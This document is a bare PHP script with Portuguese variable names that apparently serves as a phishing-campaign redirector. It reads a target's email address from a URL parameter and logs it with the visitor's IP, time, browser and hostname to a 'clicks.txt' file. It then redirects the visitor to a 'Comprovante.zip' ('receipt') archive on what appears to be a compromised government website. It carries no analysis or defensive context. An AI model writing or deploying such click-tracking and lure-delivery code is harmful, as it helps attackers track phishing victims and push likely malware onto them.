<?

$gtmail = $_GET['cliente']; 
if ($gtmail == "") { 
header("Location: http://www.dpt.go.th/dptfc/media/Comprovante.zip");
exit();
}

$ip = $_SERVER['REMOTE_ADDR'];
$hora = date("H:i");
$link = "http://www.dpt.go.th/dptfc/media/Comprovante.zip";
$useragent = $_SERVER['HTTP_USER_AGENT'];
$ipo = gethostbyaddr($_SERVER['REMOTE_ADDR']);

header("Location: ".$link);

 if (preg_match('/MSIE/i', $useragent)) {
    $browser = 'IE';

  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent)) {
    $browser = 'Opera';

  } elseif(preg_match('|Firefox/([0-9.]+)|',$useragent)) {
    $browser = 'Firefox';

  } elseif(preg_match('|Chrome/([0-9.]+)|',$useragent)) {
    $browser = 'Chrome';

  } elseif(preg_match('|Safari/([0-9.]+)|',$useragent,$matched)) {
    $browser = 'Safari';

  } else {
    $browser= 'other';
  }

$dds = "
[$hora] - [$ip] - $gtmail - $browser - $ipo";

$arquivo = "clicks.txt";
$abre = fopen($arquivo, "a");
fwrite ($abre, $dds);
fclose ($abre);


?>